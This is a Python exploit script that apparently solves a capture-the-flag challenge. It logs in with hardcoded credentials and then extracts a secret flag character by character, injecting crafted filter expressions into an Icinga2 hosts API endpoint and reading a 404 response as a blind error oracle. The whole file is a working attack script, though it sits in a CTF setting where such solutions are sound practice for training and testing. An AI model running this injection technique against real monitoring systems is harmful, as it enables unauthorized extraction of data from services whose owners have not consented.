#!/usr/bin/env python3

import requests
import sys
import json
import string
import urllib.parse

def find_flag(session, host, port):
    """Find the flag character by character by exploiting the error returned"""
    # Define the character set: lowercase, uppercase, numbers, special characters
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&()_+-=[]{}|;':\",./<>?`~"

    flag = "WPCTF{"
    print(f"[+] Current flag: {flag}")

    while not flag.endswith("}"):
        found_char = None

        for char in charset:
            # Build the current test string
            test_string = flag + char

            # Create the filter query
            #filter_query = f'match("{test_string}*",host.name)&&regex("BROKEN(",host.name)'
            filter_query = f'match("{test_string}*",host.name)&&BROKEN_FILTER'

            # URL encode the filter
            encoded_filter = urllib.parse.quote(filter_query)

            # Make the request
            url = f"http://{host}:{port}/icinga2/v1/objects/hosts?filter={encoded_filter}"

            try:
                response = session.get(url)

                # If status is 404, this character is valid
                if response.status_code == 404:
                    found_char = char
                    flag += char
                    print(f"[+] Found character: '{char}' - Current flag: {flag}")
                    break

            except Exception as e:
                print(f"[-] Error testing character '{char}': {e}")
                continue

        # If no character found, we might be done or hit an issue
        if found_char is None:
            print("[-] No valid character found. Stopping brute force.")
            break

    print(f"[+] Final flag: {flag}")
    return flag

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = sys.argv[2]

    # Create session to maintain cookies
    session = requests.Session()

    login_url = f"http://{host}:{port}/login"
    login_data = {
        "username": "Peter",
        "password": "peter_120867"
    }

    print(f"[+] Making login request to {login_url}")
    try:
        login_response = session.post(login_url, json=login_data)
        print(f"[+] Login response status: {login_response.status_code}")

        # Print cookies received
        if session.cookies:
            print(f"[+] Cookies received: {dict(session.cookies)}")
        else:
            print("[-] No cookies received")

        if login_response.status_code != 200:
            print(f"[-] Login failed with status {login_response.status_code}")
            return

    except Exception as e:
        print(f"[-] Error during login: {e}")
        return

    flag = find_flag(session, host, port)

if __name__ == "__main__":
    main()
